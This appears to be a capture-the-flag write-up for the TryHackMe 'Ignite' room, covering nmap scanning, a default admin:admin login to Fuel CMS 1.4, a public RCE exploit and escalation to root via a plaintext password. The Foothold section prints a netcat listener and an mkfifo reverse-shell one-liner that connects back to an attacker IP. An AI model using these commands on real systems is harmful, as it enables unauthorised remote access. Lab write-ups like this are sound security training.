# **Description**

Hello l33ts, I hope you are doing well. Today we are going to look at [Ignite](https://tryhackme.com/room/ignite) from [TryHackMe](https://tryhackme.com), and easy machine where we find a CMS vulnerable to RCE, we use an exploit to help us get a reverse shell on the machine, then we look through the CMS files to find a plain text password of root.

# **Enumeration**
## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressice scan to provide faster results.

```terminal
Nmap scan report for 10.10.89.94
Host is up (0.11s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to FUEL CMS
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry
|_/fuel/
```

We only have port 80 open, and there is a robots.txt file, let's run a directory scan while we go check the webpage.

## WebPage

Let's navigate to the webpage.

![webpage](/assets/img/tryhackme/ignite/igniteweb.png)

We have Fuel CMS with version 1.4 running on the webserver. There is nothing else, let's check what we got from the directory scan.

## Gobuster

```terminal

===============================================================
```
Let's navigate to **/robots.txt**.

![robts](/assets/img/tryhackme/ignite/robots.png)

There is 1 disallowed entry, **/fuel**, let's see what there.

![login](/assets/img/tryhackme/ignite/loginpage.png)

We found a login page for **fuelcms**, let's see if we can get in by submitting some knows credentials.

![panle](/assets/img/tryhackme/ignite/panel.png)

I managed to login using **admin:admin**

Let's check if there is any exploit for this version of fuel cms.

![exploit](/assets/img/tryhackme/ignite/ignitexploitdb.png)

We found 3 RCE exploit, let's download one of the exploit and try run some commands. I will be using this [exploit](https://www.exploit-db.com/exploits/50477).

# **Foothold**

Let's run the exploit now.

![rce](/assets/img/tryhackme/ignite/rce.png)

We are able now to execute code on the machine, let's get a proper shell.

First, setup a listener on your attacking machine(`nc -lnvp 9001`) and execute the following command on the RCE prompt `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.10.10 9001 >/tmp/f`
>NOTE: Change the ip address on the command

![rce](/assets/img/tryhackme/ignite/mkfifo.png)

![rce](/assets/img/tryhackme/ignite/shell.png)

I used the python import pty trick to stabilize my shell.

# **Privilege Escalation**

For Privilege Escalation, i uploaded linpeas to the machine to do the scan for me.

![wget](/assets/img/tryhackme/ignite/wget.png)

Let's run the script and see what it will find.

![rootpass](/assets/img/tryhackme/ignite/rootpass.png)

There is a root password in plain text in one of the file of the application. Let's see if it works.

![root](/assets/img/tryhackme/ignite/root.png)

Great! The password worked and we got root access.
